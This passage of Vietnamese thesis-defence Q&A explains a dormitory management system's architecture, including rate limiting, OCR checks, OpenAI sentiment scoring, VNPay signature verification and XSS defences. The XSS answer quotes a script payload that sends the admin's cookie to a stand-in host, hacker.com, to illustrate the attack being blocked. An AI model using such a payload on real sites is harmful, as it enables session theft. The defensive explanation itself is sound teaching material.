2. Kiểm tra khả năng nâng cấp: Song song với quá trình gửi nhận dữ liệu bằng Long-polling, Client gửi một yêu cầu thăm dò (probe) dạng WebSocket handshake lên server để kiểm tra xem trình duyệt và mạng có hỗ trợ WebSocket hay không.
3. Nâng cấp kết nối (Upgrade): Nếu probe thành công, Engine.IO sẽ tự động chuyển đổi luồng dữ liệu sang giao thức WebSocket (sử dụng kết nối TCP liên tục duy nhất, giảm thiểu tối đa overhead của header HTTP) và đóng luồng Long-polling cũ. Quy trình này diễn ra hoàn toàn tự động và trong suốt với lập trình viên.

### Câu hỏi 25: Tại sao hệ thống lại tích hợp Redis? Cơ chế hoạt động của Redis trong việc Rate-limiting bảo vệ API chống spam như thế nào?
Trả lời của sinh viên:
Redis là cơ sở dữ liệu lưu trữ cấu trúc dữ liệu trong bộ nhớ RAM (In-memory database) với tốc độ đọc ghi cực nhanh (dưới một mili-giây). Hệ thống tích hợp Redis làm bộ nhớ đệm (cache) và công cụ triển khai giới hạn tần suất yêu cầu (Rate-limiting).
Cơ chế Rate-limiting bảo vệ API chống spam:
1. Khi có request gửi lên một API nhạy cảm (như đăng nhập hoặc gửi OTP), Middleware rate limiter sẽ trích xuất địa chỉ IP của Client hoặc Email đăng nhập để tạo một khóa (Key) trong Redis, ví dụ: `rate:login:ip_address`.
2. Hệ thống gọi lệnh `INCR` của Redis trên Key này để tăng số đếm số lượt yêu cầu.
3. Nếu Key mới được tạo lần đầu, hệ thống thiết lập thời gian hết hạn (TTL - Time to Live) cho Key đó là một phút bằng lệnh `EXPIRE`.
4. Hệ thống kiểm tra giá trị của đếm. Nếu giá trị đếm vượt quá ngưỡng cấu hình (ví dụ lớn hơn 10 lượt một phút), hệ thống lập tức chặn yêu cầu và trả về lỗi HTTP 429 mà không cần thực hiện các truy vấn DB hay xử lý bcrypt tốn tài nguyên.

---

## PHẦN 4: TRÍ TUỆ NHÂN TẠO VÀ DỊCH VỤ ĐÁM MÂY (AI & CLOUD SERVICES)

### Câu hỏi 26: Tại sao Google Cloud Vision OCR lại được chọn để đối soát ảnh minh chứng? Độ chính xác của dịch vụ này phụ thuộc vào những yếu tố nào?
Trả lời của sinh viên:
Lý do lựa chọn Google Cloud Vision OCR: Dịch vụ này có khả năng nhận dạng chữ viết tay và chữ in tiếng Việt (chữ có dấu) cực kỳ chính xác nhờ công nghệ Deep Learning được huấn luyện trên tập dữ liệu khổng lồ của Google. Đồng thời API của dịch vụ rất ổn định, thời gian phản hồi nhanh và dễ tích hợp qua NodeJS SDK.
Độ chính xác của OCR phụ thuộc vào bốn yếu tố thực tế:
- Độ phân giải và chất lượng hình ảnh: Ảnh bị mờ, rung hoặc thiếu sáng sẽ làm giảm tỷ lệ nhận dạng chính xác.
- Góc chụp và độ nghiêng: Ảnh chụp bị nghiêng quá nhiều hoặc bị lật ngược cần thuật toán tiền xử lý xoay ảnh trước khi nhận dạng.
- Chữ viết tay phức tạp: Mặc dù nhận dạng chữ in trên thẻ CCCD hay giấy chứng nhận đạt độ chính xác gần một trăm phần trăm, chữ viết tay của bác sĩ hoặc cán bộ địa phương trên một số mẫu đơn có thể có sai số. Do đó hệ thống luôn có cơ chế đối soát độ tin cậy và gắn cờ cảnh báo để Admin rà soát lại nếu cần.

### Câu hỏi 27: Khi sinh viên tải lên một ảnh minh chứng bị mờ, nghiêng hoặc cố tình làm giả, hệ thống OCR và Backend sẽ xử lý thế nào?
Trả lời của sinh viên:
Hệ thống xử lý tình huống này qua quy trình bảo vệ ba lớp:
Lớp 1: Kiểm tra định dạng và dung lượng file ở Middleware Upload (Multer) để chặn các file độc hại hoặc file quá lớn.
Lớp 2: Khi gửi ảnh lên Google Cloud Vision, dịch vụ sẽ trả về tọa độ các khối văn bản (text blocks) và chỉ số tin cậy nhận dạng (confidence score) kèm nội dung text. Nếu ảnh quá mờ hoặc không chứa chữ viết, Vision API trả về mảng text rỗng hoặc confidence score dưới mức ngưỡng an toàn (ví dụ dưới sáu mươi phần trăm). Backend lập tức phát hiện và cập nhật trạng thái hồ sơ thành Cần đối soát thủ công kèm ghi chú cảnh báo cho Admin.
Lớp 3: Backend thực hiện đối soát chéo (Text Matching). Ví dụ: Sinh viên khai báo tên là Bùi Xuân Sơn, đối tượng hộ nghèo tại Nam Định. Nếu OCR quét ảnh thẻ hộ nghèo và không tìm thấy từ khóa Nam Định hay tên Bùi Xuân Sơn trùng khớp, hệ thống cũng tự động gắn cờ cảnh báo nghi vấn giả mạo.

### Câu hỏi 28: Giải thích luồng dữ liệu tích hợp OpenAI API trong khâu phân tích cảm xúc (Sentiment Analysis) ý kiến phản ánh?
Trả lời của sinh viên:
Luồng dữ liệu phân tích cảm xúc phản ánh diễn ra qua năm bước:
1. Sinh viên gửi ý kiến phản ánh (ví dụ: Điện phòng em bị hỏng ba ngày rồi nóng quá không ngủ được) từ Frontend lên API `/api/feedbacks`.
2. FeedbackController tiếp nhận và chuyển tiếp nội dung text cho FeedbackService.
3. FeedbackService gọi OpenAI Service, gửi nội dung phản ánh kèm theo một System Prompt được thiết kế chuyên biệt để yêu cầu mô hình phân tích và chấm điểm cảm xúc.
4. OpenAI API phân tích ngữ nghĩa và trả về một cấu trúc dữ liệu JSON chứa: Cảm xúc chủ đạo (Tích cực, Tiêu cực, Trung tính), Điểm số độ bức xúc (từ 1 đến 5) và Tóm tắt ngắn nội dung phản ánh.
5. Service lưu các chỉ số cảm xúc này vào bảng feedbacks trong database. Các phản ánh có điểm bức xúc cao (điểm 4, 5) sẽ được đẩy lên đầu danh sách hiển thị của Admin kèm biểu tượng cảnh báo khẩn cấp để xử lý ngay.

### Câu hỏi 29: Cấu trúc Prompt (Prompt Engineering) gửi lên OpenAI API để phân tích cảm xúc phản ánh được em thiết kế như thế nào để đảm bảo kết quả trả về là JSON chuẩn và chính xác?
Trả lời của sinh viên:
Để đảm bảo kết quả trả về từ OpenAI API luôn là JSON chuẩn để hệ thống tự động phân tích cú pháp (JSON.parse) không bị lỗi, em đã áp dụng cấu trúc Prompt Engineering chặt chẽ:
System Prompt: Em định nghĩa rõ vai trò của mô hình là một chuyên gia phân tích ngôn ngữ tự nhiên. Em yêu cầu bắt buộc phản hồi duy nhất dưới định dạng JSON với cấu trúc cố định gồm ba trường: `sentiment` (giá trị chỉ nhận POSITIVE, NEGATIVE, NEUTRAL), `urgency_score` (giá trị số nguyên từ 1 đến 5) và `summary` (chuỗi văn bản tóm tắt dưới 15 từ).
Em thiết lập tham số `response_format: { type: "json_object" }` trong cấu hình gọi API của OpenAI để ép buộc mô hình chỉ được trả về JSON hợp lệ.
Em cung cấp các ví dụ mẫu (Few-shot Prompting) trực tiếp trong prompt để định hình rõ cách phân loại điểm số mức độ khẩn cấp đối với các kịch bản hỏng điện, hỏng nước, hay góp ý thông thường.

### Câu hỏi 30: Việc gọi API OpenAI liên tục có thể gây tốn chi phí và dính Rate Limit của OpenAI. Em đã tối ưu hóa khía cạnh này thế nào trong Backend?
Trả lời của sinh viên:
Em đã tối ưu hóa hiệu năng và chi phí gọi OpenAI API bằng hai giải pháp kỹ thuật cụ thể:
Một là sử dụng mô hình tối ưu chi phí: Em sử dụng dòng mô hình gpt-4o-mini của OpenAI. Đây là mô hình thế hệ mới có chi phí cực kỳ rẻ (chỉ bằng một phần mười so với gpt-4o) nhưng vẫn đảm bảo độ chính xác vượt trội cho các tác vụ phân tích văn bản ngắn.
Hai là áp dụng cơ chế bộ lọc thô (Rule-based Filter) trước khi gọi AI: Hệ thống không gửi tất cả mọi phản ánh lên AI. Đối với các phản ánh quá ngắn dưới mười ký tự hoặc các phản ánh có mẫu từ khóa đơn giản (ví dụ: mất nước, cháy bóng đèn), Backend sử dụng các biểu thức chính quy (Regex) và từ điển từ khóa để tự động gán điểm khẩn cấp sơ bộ, chỉ các phản ánh có nội dung phức tạp hoặc mô tả dài mới được gửi lên OpenAI API để phân tích chuyên sâu.

### Câu hỏi 31: Trợ lý ảo Chatbot AI trong phân hệ Sinh viên làm thế nào để nhớ được lịch sử cuộc trò chuyện (Context Memory)? Bộ nhớ này được lưu ở đâu?
Trả lời của sinh viên:
Mô hình ngôn ngữ lớn (LLM) bản chất là không trạng thái (stateless), nghĩa là mỗi lần gọi API nó hoàn toàn không nhớ các câu hỏi trước đó. Để tạo ra trải nghiệm trợ lý ảo ghi nhớ ngữ cảnh (Context Memory), em đã triển khai giải pháp quản lý lịch sử hội thoại:
Cấu trúc bộ nhớ: Mỗi cuộc hội thoại của sinh viên được gán một `sessionId`. Hệ thống lưu trữ mảng các tin nhắn trước đó của phiên dưới dạng một danh sách có định dạng cấu trúc chuẩn: `[ { role: "user", content: "..." }, { role: "assistant", content: "..." } ]`.
Vị trí lưu trữ:
- Trong quá trình phiên chat đang diễn ra, lịch sử hội thoại được lưu tạm thời trong RAM của NodeJS server (hoặc Redis) để truy xuất tức thì.
- Khi gọi API OpenAI, Backend sẽ đính kèm toàn bộ mảng lịch sử tin nhắn này vào tham số `messages` gửi lên AI. Nhờ đó, AI có đầy đủ thông tin bối cảnh của các câu hỏi trước để trả lời câu hỏi hiện tại một cách nhất quán.
- Em giới hạn số lượng tin nhắn ghi nhớ (ví dụ chỉ lấy 10 tin nhắn gần nhất) để tránh làm phình kích thước prompt gửi lên AI, giúp tiết kiệm chi phí và tăng tốc độ phản hồi.

### Câu hỏi 32: Google Sheets và Google Drive API được dùng để làm gì trong đồ án? Luồng đồng bộ dữ liệu diễn ra tự động hay thủ công?
Trả lời của sinh viên:
Ứng dụng của Google Cloud APIs trong đồ án:
Google Sheets API: Dùng để nhập dữ liệu hàng loạt (Import) danh sách đơn đăng ký của sinh viên từ Google Forms của nhà trường. Thay vì sinh viên phải khai báo trực tiếp trên web, Ban quản lý chỉ cần nhập link bảng tính Google Sheets chứa kết quả form đăng ký, Backend sẽ tự động đọc dữ liệu và lưu vào PostgreSQL.
Google Drive API: Sử dụng làm kho lưu trữ đám mây (Cloud Storage) để lưu trữ các tệp ảnh minh chứng chính sách và tệp PDF hợp đồng xuất bản. Việc này giúp giảm tải dung lượng ổ cứng cho máy chủ Backend và đảm bảo an toàn dữ liệu không bị mất mát khi máy chủ xảy ra sự cố phần cứng.
Luồng đồng bộ: Hoạt động theo cơ chế Bán tự động. Ban quản lý chủ động kích hoạt lệnh Nhập dữ liệu từ Google Sheets trên giao diện quản trị. Khi có tệp mới được tải lên hệ thống qua multer, Backend sẽ tự động đẩy tệp đó lên thư mục chia sẻ trên Google Drive và lưu lại liên kết Drive URL vào cơ sở dữ liệu.

---

## PHẦN 5: NGHIỆP VỤ CỐT LÕI VÀ THUẬT TOÁN (CORE LOGIC & ALGORITHMS)

### Câu hỏi 33: Giải thích công thức tính điểm hồ sơ xét tuyển ký túc xá: Score = (P * wPrior) + (Y * wYear) + (G * wGPA). Ý nghĩa của từng tham số và trọng số?
Trả lời của sinh viên:
Công thức tính điểm xét duyệt hồ sơ là mô hình toán học hóa chính sách tuyển sinh nội trú của nhà trường:
P (Priority Score): Điểm ưu tiên chính sách (Hộ nghèo/cận nghèo = 100 điểm; Thương binh, liệt sỹ, khuyết tật = 70 điểm; Vùng sâu vùng xa = 50 điểm; Không có ưu tiên = 0 điểm).
Y (Year Score): Điểm ưu tiên theo năm học (Năm 1 = 100 điểm để hỗ trợ tân sinh viên ổn định học tập; Năm 2 = 60 điểm; Năm 3 = 40 điểm; Năm 4 = 20 điểm).
G (GPA Score): Điểm học tập quy đổi đối với sinh viên khóa cũ (Điểm GPA hệ 4 nhân với hệ số 25 để quy đổi về thang điểm 100; Tân sinh viên chưa có điểm GPA được gán cố định 50 điểm).
wPrior, wYear, wGPA: Các trọng số do Ban quản lý cấu hình trong khoảng từ 0.0 đến 1.0 (ví dụ: wPrior = 0.5; wYear = 0.3; wGPA = 0.2, tổng ba trọng số bằng 1.0).
Ý nghĩa thực tiễn: Giúp Ban quản lý linh hoạt điều chỉnh chính sách ưu tiên xét duyệt của nhà trường theo từng năm học mà không cần thay đổi mã nguồn. Ví dụ, nếu năm nay nhà trường muốn ưu tiên cao cho sinh viên có thành tích học tập xuất sắc, Admin chỉ cần tăng trọng số wGPA lên và giảm trọng số wYear xuống.

### Câu hỏi 34: Nếu hai sinh viên có điểm số xét tuyển bằng nhau (tie-breaker) nhưng chỉ còn một giường trống duy nhất trong phòng phù hợp, thuật toán gán phòng tự động sẽ ưu tiên ai?
Trả lời của sinh viên:
Trong trường hợp xảy ra tranh chấp chỉ tiêu khi điểm số xét tuyển của hai sinh viên bằng nhau hoàn toàn, thuật toán xếp phòng tự động áp dụng cơ chế phân lớp ưu tiên phụ (Tie-breaker logic) theo ba tiêu chí phụ xếp tầng:
Tiêu chí 1: Khoảng cách địa lý. Ưu tiên sinh viên có địa chỉ thường trú cách xa trường hơn (thông số distance trích xuất từ thông tin hồ sơ).
Tiêu chí 2: Thời gian nộp hồ sơ đăng ký. Hệ thống ưu tiên sinh viên nộp đơn sớm hơn (trường created_at trong bảng register_forms).
Tiêu chí 3: Trạng thái đóng phí đặt cọc trước (nếu có).
Cơ chế xếp tầng này đảm bảo tính minh bạch tuyệt đối, tự động giải quyết tranh chấp chỉ tiêu mà không cần có sự can thiệp chủ quan từ con người.

### Câu hỏi 35: Khi xếp phòng tự động, làm thế nào thuật toán đảm bảo sinh viên cùng giới tính và cùng ngành/khoa sẽ được xếp vào chung một phòng ở?
Trả lời của sinh viên:
Thuật toán xếp phòng tự động của hệ thống thực thi theo quy trình lọc ba bước:
Bước 1: Lọc theo Giới tính (Gender Match). Hệ thống truy vấn danh sách các phòng còn giường trống có thuộc tính `gender_type` trùng khớp với giới tính của sinh viên (Tòa A, C chỉ xếp Nam; Tòa B, D chỉ xếp Nữ).
Bước 2: Phân nhóm theo Khoa/Ngành (Faculty/Major Grouping). Để hỗ trợ sinh viên cùng ngành dễ dàng giúp đỡ nhau trong học tập, thuật toán sẽ tìm kiếm trong số các phòng trống xem có phòng nào đã có sinh viên cùng khoa với sinh viên này đang o hay không. Nếu có và phòng còn giường, hệ thống sẽ ưu tiên gán sinh viên vào phòng đó.
Bước 3: Lấp đầy phòng (Room Filling). Nếu không tìm thấy phòng nào có sinh viên cùng khoa ngành, hệ thống sẽ gán sinh viên vào một phòng trống bất kỳ cùng giới tính có tỷ lệ lấp đầy thấp nhất để đảm bảo cân bằng mật độ phòng o.

### Câu hỏi 36: Logic tính toán hóa đơn điện nước hoạt động thế nào? Chỉ số cũ và chỉ số mới được quản lý như thế nào để tránh sai lệch dữ liệu?
Trả lời của sinh viên:
Logic tính toán hóa đơn điện nước được quản lý nghiêm ngặt qua cấu trúc quan hệ dữ liệu:
Mỗi phòng o có một bảng ghi nhận chỉ số công tơ điện nước định kỳ. Khi tạo hóa đơn tháng mới, Backend thực hiện:
1. Truy vấn chỉ số điện nước cuối cùng của tháng trước từ bảng lịch sử chỉ số phòng (đây chính là Chỉ số cũ - Old Index). Chỉ số cũ này được hệ thống tự động khóa và lấy ra từ database, Ban quản lý không được phép chỉnh sửa tay trường này để tránh gian lận chỉ số.
2. Ban quản lý chỉ nhập Chỉ số mới (New Index). Backend kiểm tra điều kiện ràng buộc: Chỉ số mới phải lớn hơn hoặc bằng Chỉ số cũ. Nếu nhỏ hơn, hệ thống lập tức báo lỗi dữ liệu không hợp lệ.
3. Lượng tiêu thụ thực tế = Chỉ số mới - Chỉ số cũ.
4. Tiền điện nước = Lượng tiêu thụ * Đơn giá định mức (đơn giá được lấy từ bảng settings cấu hình).
5. Hóa đơn mới được tạo ra gắn liền với mã phòng và tháng lập hóa đơn, đảm bảo mỗi phòng chỉ có duy nhất một hóa đơn dịch vụ trong một tháng.

### Câu hỏi 37: Làm thế nào hệ thống phát hiện được rò rỉ nước hoặc thất thoát điện của một phòng thông qua phân tích chỉ số hóa đơn?
Trả lời của sinh viên:
Hệ thống phát hiện rò rỉ hoặc thất thoát năng lượng thông qua thuật toán kiểm tra độ lệch phân kỳ (Divergence Check):
Khi Ban quản lý nhập chỉ số điện nước mới, Service sẽ tính toán lượng tiêu thụ tháng này.
Hệ thống truy vấn lịch sử lượng tiêu thụ của phòng đó trong ba tháng trước và tính giá trị trung bình (Average Consumption).
Hệ thống áp dụng công thức so sánh:
Nếu Lượng tiêu thụ tháng này > Average Consumption * 1.5 (tức tăng đột biến trên năm mươi phần trăm) đồng thời vượt quá một ngưỡng tối thiểu nhất định để loại trừ trường hợp phòng trống có người chuyển vào (ví dụ: lượng nước vượt quá 30 mét khối một tháng), hệ thống sẽ đánh dấu hóa đơn này là bất thường và gửi cảnh báo đỏ: Nghi vấn rò rỉ đường ống nước hoặc thất thoát điện phòng o.
Thông tin này giúp Ban quản lý nhanh chóng cử nhân viên kỹ thuật xuống phòng kiểm tra đường ống và thiết bị điện để khắc phục sự cố kịp thời cho sinh viên.

### Câu hỏi 38: Cổng thanh toán VNPay-QR được tích hợp vào hệ thống như thế nào? Quy trình thanh toán diễn ra qua những bước nào?
Trả lời của sinh viên:
Hệ thống tích hợp cổng thanh toán VNPay theo chuẩn API thanh toán của VNPay sử dụng mã hóa bảo mật SHA512.
Quy trình thanh toán gồm bốn bước:
Bước 1: Sinh viên vào phân hệ cá nhân, chọn hóa đơn chưa thanh toán và bấm nút Thanh toán qua VNPay.
Bước 2: Backend tiếp nhận yêu cầu, sinh mã giao dịch duy nhất, tính toán số tiền và xây dựng chuỗi tham số gửi lên VNPay (bao gồm mã Merchant, mã Terminal, URL phản hồi, địa chỉ IP của client). Backend thực hiện ký số chuỗi tham số này bằng mã bí mật Hash Secret cấp bởi VNPay để tạo ra tham số `vnp_SecureHash` và tạo ra URL chuyển hướng gửi về cho Frontend.
Bước 3: Frontend nhận URL và chuyển hướng sinh viên sang cổng thanh toán của VNPay để sinh viên quét mã QR thanh toán bằng app ngân hàng.
Bước 4: Sau khi sinh viên thanh toán thành công, VNPay chuyển hướng người dùng về trang kết quả (Return URL) trên Frontend, đồng thời gọi ngầm một API thông báo kết quả (IPN URL) trực tiếp đến Backend của hệ thống để cập nhật trạng thái hóa đơn.

### Câu hỏi 39: Giải thích cơ chế bảo mật chữ ký số (checksum/hash) của VNPay để ngăn ngừa sinh viên giả mạo kết quả thanh toán trên URL?
Trả lời của sinh viên:
Nếu không có chữ ký số bảo mật, sinh viên có thể cố tình thay đổi tham số trên URL phản hồi (ví dụ sửa `vnp_ResponseCode` thành `00` là mã thành công) để đánh lừa hệ thống rằng đã thanh toán hóa đơn.
Cơ chế bảo mật chữ ký số của VNPay ngăn chặn điều này bằng thuật toán mã hóa SHA512:
Khi khởi tạo giao dịch, Backend ký chuỗi tham số bằng mã bí mật `vnp_HashSecret` (chỉ có VNPay và Backend biết).
Khi VNPay gửi thông tin phản hồi kết quả thanh toán về (qua cả Return URL và IPN URL), VNPay cũng gửi kèm một chữ ký số bảo mật `vnp_SecureHash` được tạo ra bằng cách băm toàn bộ các tham số phản hồi với mã bí mật `vnp_HashSecret`.
Backend nhận được yêu cầu phản hồi sẽ lấy toàn bộ các tham số nhận được (loại bỏ tham số `vnp_SecureHash`), sắp xếp theo thứ tự alphabet của tên tham số, và tự thực hiện lại phép băm SHA512 với mã bí mật `vnp_HashSecret` để tạo ra một chữ ký đối soát tạm thời.
Backend tiến hành so sánh chữ ký tạm thời này với chữ ký `vnp_SecureHash` nhận được từ VNPay. Nếu hai chữ ký trùng khớp hoàn toàn, giao dịch mới được coi là hợp lệ. Điều này ngăn chặn tuyệt đối mọi hành vi giả mạo kết quả thanh toán trên URL.

### Câu hỏi 40: Cơ chế IPN (Instant Payment Notification) của VNPay hoạt động như thế nào? Tại sao nó lại là khâu quan trọng nhất để cập nhật trạng thái hóa đơn tự động?
Trả lời của sinh viên:
Cơ chế IPN (Instant Payment Notification) là dịch vụ gọi ngầm trực tiếp từ máy chủ của VNPay sang máy chủ Backend của hệ thống thông qua giao thức HTTPS.
Quy trình hoạt động: Khi sinh viên thanh toán thành công trên cổng VNPay, máy chủ VNPay sẽ gửi một HTTP request chứa kết quả giao dịch trực tiếp đến endpoint IPN của Backend (ví dụ `/api/vnpay/ipn`).
Tại sao IPN là khâu quan trọng nhất:
Nếu hệ thống chỉ phụ thuộc vào trang Return URL hiển thị trên trình duyệt sinh viên để cập nhật trạng thái hóa đơn thì sẽ gặp sự cố rất lớn: Sinh viên thanh toán thành công trên VNPay nhưng sau đó vô tình tắt trình duyệt, mất mạng đột ngột hoặc điện thoại hết pin trước khi trình duyệt chuyển hướng quay lại trang web KTX. Khi đó, Frontend không thể gọi API cập nhật trạng thái, dẫn tới hóa đơn vẫn ở trạng thái Chưa thanh toán dù tiền đã bị trừ.
Cơ chế IPN hoạt động độc lập ngầm giữa hai máy chủ, đảm bảo dù sinh viên có tắt trình duyệt thì hóa đơn vẫn được cập nhật trạng thái Đã thanh toán tự động một cách chính xác một trăm phần trăm. Backend nhận IPN sẽ kiểm tra chữ ký số, đối soát trạng thái giao dịch trong database, cập nhật trạng thái hóa đơn và phản hồi lại cho VNPay mã xác nhận thành công.

### Câu hỏi 41: Khi xuất hợp đồng điện tử ra file PDF cho sinh viên, em sử dụng thư viện nào ở Frontend hay Backend? Cơ chế render PDF đó như thế nào?
Trả lời của sinh viên:
Trong đồ án, em triển khai cơ chế kết xuất và xuất file PDF hợp đồng trực tiếp tại phân hệ Frontend của Sinh viên:
Thư viện sử dụng: Em sử dụng thư viện `html2pdf.js` (hoặc kết hợp `html2canvas` và `jsPDF`).
Cơ chế render:
Bước 1: Khi sinh viên bấm nút Xuất hợp đồng PDF, Frontend sẽ chuẩn bị một template HTML hợp đồng có cấu trúc chuẩn văn bản pháp lý, tự động điền các thông tin cá nhân của sinh viên (Họ tên, MSSV, CCCD, lớp, phòng o, giá tiền, ngày ký) lấy từ API Backend.
Bước 2: Thư viện `html2canvas` sẽ render vùng chứa HTML hợp đồng ẩn này thành một hình ảnh chất lượng cao dạng canvas trong bộ nhớ trình duyệt.
Bước 3: Thư viện `jsPDF` tiếp tục lấy ảnh canvas đó, thiết lập các tùy chọn khổ giấy (khổ A4 dọc), căn lề (margins), chất lượng ảnh và xuất ra một tệp tài liệu PDF chuẩn hóa.
Bước 4: Trình duyệt tự động kích hoạt tính năng tải file xuống thiết bị của sinh viên.
Giải pháp này giúp giảm tải hoàn toàn tài nguyên xử lý render PDF cho máy chủ Backend, giúp hệ thống phản hồi tải nhanh chóng.

---

## PHẦN 6: KIỂM THỬ, HIỆU NĂNG VÀ TRIỂN KHAI (TESTING, PERFORMANCE & DEPLOYMENT)

### Câu hỏi 42: Tại sao độ trễ của Socket.IO trong kiểm thử lại đạt dưới 200ms với 50 người dùng đồng thời? Em có giải pháp nào để tối ưu hóa hiệu năng này không?
Trả lời của sinh viên:
Độ trễ truyền tải thông tin thời gian thực qua Socket.IO đạt kết quả tối ưu dưới hai trăm mili-giây nhờ ba yếu tố kiến trúc:
Một là giao thức WebSocket kết nối liên tục (persistent connection). Khác với HTTP truyền thống phải thực hiện bắt tay TCP và gửi nhận header dung lượng lớn cho mỗi yêu cầu, WebSocket duy trì kết nối mở duy nhất giữa Client và Server, dữ liệu được truyền tải trực tiếp qua các khung nhị phân (binary frames) cực nhẹ.
Hai là NodeJS xử lý I/O không đồng bộ cực nhanh, không mất thời gian khởi tạo luồng mới cho mỗi kết nối Socket như các server Java hay PHP.
Ba là em sử dụng Room để gom nhóm Client. Khi phát thông báo, Backend chỉ phát tín hiệu đến những client trong Room liên quan (ví dụ các client đang truy cập trang Admin), tránh việc phát quảng bá (broadcast) toàn hệ thống gây nghẽn băng thông.
Giải pháp tối ưu hóa trong tương lai: Khi số lượng người dùng đồng thời tăng lên hàng nghìn, một server NodeJS đơn lẻ sẽ bị quá tải RAM để duy trì kết nối Socket. Giải pháp là cấu hình Redis Adapter làm Message Broker để phân phối các sự kiện Socket.IO ra nhiều server Backend chạy song song đằng sau một Load Balancer.

### Câu hỏi 43: Trình bày các kịch bản kiểm thử (Test Cases) quan trọng nhất mà em đã thực hiện? Kết quả nghiệm thu thực tế ra sao?
Trả lời của sinh viên:
Em đã xây dựng và thực thi ba mươi kịch bản kiểm thử tích hợp (Integration Test Cases) tập trung vào các luồng nghiệp vụ cốt lõi:
1. Luồng phê duyệt hồ sơ và xếp phòng tự động: Kiểm thử trường hợp hồ sơ hợp lệ được duyệt lô tự động xem hệ thống có tạo đúng tài khoản người dùng, gán đúng mã phòng và tự động gửi email hợp đồng hay không. (Kết quả: Đạt).
2. Luồng tính toán và thanh toán hóa đơn VNPay: Kiểm thử tính chính xác của công thức tính tiền điện nước, cơ chế phát hiện bất thường chỉ số tiêu thụ, việc ký số bảo mật SHA512 URL thanh toán và kiểm thử IPN cập nhật trạng thái hóa đơn tự động khi giả lập kết quả giao dịch VNPay thành công/thất bại. (Kết quả: Đạt).
3. Luồng ghi nhận kỷ luật và trừ điểm rèn luyện: Kiểm thử khi Admin thêm quyết định kỷ luật đối với sinh viên thì điểm rèn luyện hiển thị trên portal sinh viên có tự động cập nhật thời gian thực hay không. (Kết quả: Đạt).
Kết quả nghiệm thu thực tế: Toàn bộ ba mươi trên ba mươi kịch bản kiểm thử đều đạt kết quả ĐẠT (PASS), hệ thống vận hành đúng logic nghiệp vụ thiết kế, không phát sinh lỗi xung đột dữ liệu hay treo hệ thống.

### Câu hỏi 44: Cơ chế phân quyền (Authorization Middleware) ở Backend được viết như thế nào để đảm bảo sinh viên không thể gọi các API nhạy cảm của Admin?
Trả lời của sinh viên:
Cơ chế phân quyền ở Backend được quản lý chặt chẽ thông qua Middleware xác thực bảo mật viết bằng NodeJS:
Em thiết lập ba middleware bảo mật chính chạy theo chuỗi (chain of middlewares):
1. Middleware `authenticate`: Đây là lớp chặn đầu tiên. Middleware này lấy Token từ Header Authorization, thực hiện giải mã bằng JWT_SECRET. Nếu token hợp lệ, nó sẽ gắn đối tượng giải mã `req.user` (chứa các thông tin id, email, role) vào đối tượng request hiện tại và gọi hàm `next()`. Nếu không hợp lệ hoặc thiếu token, lập tức trả về mã lỗi HTTP 401 Unauthorized.
2. Middleware `requireAdmin`: Được áp dụng cho tất cả các route của phân hệ quản trị (như duyệt hồ sơ, tạo phòng o, xóa dữ liệu). Middleware này kiểm tra trường `req.user.role`. Nếu giá trị khác `ADMIN` (hoặc `STAFF`), hệ thống lập tức chặn yêu cầu và trả về lỗi HTTP 403 Forbidden (Không có quyền truy cập) mà không cho phép đi tiếp vào controller xử lý nghiệp vụ.
3. Middleware `requireStudent`: Tương tự, áp dụng cho các route cá nhân của sinh viên, đảm bảo sinh viên chỉ truy cập được dữ liệu của chính mình bằng cách đối chiếu `req.user.userId` với tham số ID yêu cầu truy cập.

### Câu hỏi 45: Làm thế nào em chống lại lỗ hổng bảo mật XSS (Cross-Site Scripting) khi sinh viên gửi ý kiến phản ánh chứa mã HTML hoặc JavaScript độc hại lên hệ thống?
Trả lời của sinh viên:
Lỗ hổng XSS xảy ra nếu sinh viên gửi một phản ánh có chứa mã độc dạng `<script>window.location='http://hacker.com/steal?cookie='+document.cookie</script>` và hệ thống hiển thị nguyên văn nội dung này lên màn hình của Admin, khiến mã độc thực thi trên trình duyệt của Admin.
Em đã chặn đứng lỗ hổng XSS bằng hai cơ chế bảo vệ:
Một là làm sạch dữ liệu đầu vào tại Backend (Sanitization): Trước khi lưu phản ánh vào PostgreSQL, dữ liệu text được đi qua một hàm lọc sử dụng thư viện `xss` hoặc `dompurify`. Hàm này sẽ tự động loại bỏ toàn bộ các thẻ HTML nguy hại (như `<script>`, `<iframe>`, `onload`, `onerror`) và chỉ giữ lại văn bản an toàn.
Hai là mã hóa dữ liệu đầu ra tại Frontend (Encoding): Khi React render nội dung phản ánh lên giao diện (ví dụ dùng `{feedback.content}`), React tự động mã hóa thực thể HTML (HTML entity encoding), chuyển đổi các ký tự `<` thành `&lt;` và `>` thành `&gt;`. Điều này đảm bảo trình duyệt hiển thị mã độc dưới dạng văn bản thuần túy chứ hoàn toàn không thực thi nó như một đoạn mã lệnh.

### Câu hỏi 46: Cơ chế tự động quét hợp đồng quá hạn (Expired Contracts) hoạt động như thế nào? Có dùng cron job hay thư viện scheduler nào không?
Trả lời của sinh viên:
Cơ chế tự động quét hợp đồng quá hạn được xây dựng dạng tiến trình chạy ngầm định kỳ (Background Worker) trong Backend:
Thư viện sử dụng: Em sử dụng thư viện `node-cron` để thiết lập lập lịch tác vụ tự động.
Cơ chế hoạt động:
1. Em cấu hình một cron job chạy tự động vào lúc 0 giờ 0 phút hàng ngày: `0 0 * * *`.
2. Khi tác vụ được kích hoạt, hệ thống sẽ tự động thực hiện truy vấn cơ sở dữ liệu: Tìm tất cả các hợp đồng trong bảng `student_contracts` có trạng thái là `Active` nhưng có ngày kết thúc (`end_date`) nhỏ hơn hoặc bằng ngày hiện tại.
3. Đối với các hợp đồng quá hạn tìm được, hệ thống sẽ thực hiện giao dịch (Transaction): Cập nhật trạng thái hợp đồng thành `Expired`, giải phóng trạng thái giường o của phòng tương ứng (giảm số lượng giường đang o và tăng số giường trống), và gọi EmailService gửi thông báo yêu cầu làm thủ tục gia hạn hoặc thanh lý phòng đến cho sinh viên.
Quy trình này hoạt động tự động hoàn toàn dưới nền của máy chủ Backend mà không cần Admin phải rà soát thủ công.

### Câu hỏi 47: Làm thế nào hệ thống giải quyết vấn đề bất đồng bộ khi nhiều Admin cùng phê duyệt một hồ sơ hoặc xếp cùng một phòng ở tại cùng một thời điểm?
Trả lời của sinh viên:
Đây là bài toán tranh chấp tài nguyên đồng thời (Concurrency Control). Nếu hai Admin cùng phê duyệt và xếp hai sinh viên vào chiếc giường trống cuối cùng của một phòng o cùng lúc, có thể dẫn đến việc phòng bị vượt quá sức chứa cho phép.
Cách giải quyết trong đồ án:
